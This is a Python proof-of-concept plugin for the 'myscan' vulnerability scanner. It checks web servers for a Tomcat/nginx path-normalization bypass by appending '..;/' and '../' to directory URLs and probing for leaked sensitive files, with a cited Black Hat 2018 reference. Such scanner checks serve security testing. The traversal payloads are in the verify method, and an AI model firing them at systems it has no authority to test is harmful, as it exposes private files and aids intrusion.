# !/usr/bin/env python3
# @Time    : 2020/8/21
# @Author  : caicai
# @File    : poc_tomcat-manager-pathnormalization.py
import copy
from myscan.config import scan_set
from myscan.lib.helper.request import request
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.base import PocBase
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.pocs.perfolder.info.myscan_sensitive_file_leak import POC as poc_info

class POC(PocBase):
    def __init__(self, workdata):
        self.workdata = workdata
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "tomcat manager path normalization or nginx"
        self.vulmsg = '''referer:https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf'''
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") not in [4, 5, 6]:  # 跑一级二级三级目录
            return

        # 把file_leak 一些目录集成
        self.infopoc = poc_info(copy.deepcopy(self.workdata))
        self.infopoc.url = self.url + "..;/"
        try:
            self.infopoc.verify()
            self.result += self.infopoc.result
        except:
            pass
        # new way
        self.infopoc = poc_info(copy.deepcopy(self.workdata))
        self.infopoc.url = self.url[:-1] + "../"
        try:
            self.infopoc.verify()
            self.result += self.infopoc.result
        except:
            pass
        for res in self.result:
            res["name"] = self.name
            res["detail"]["vulmsg"] = self.vulmsg

            # self.can_output(parse.getrootpath() + self.name, True)
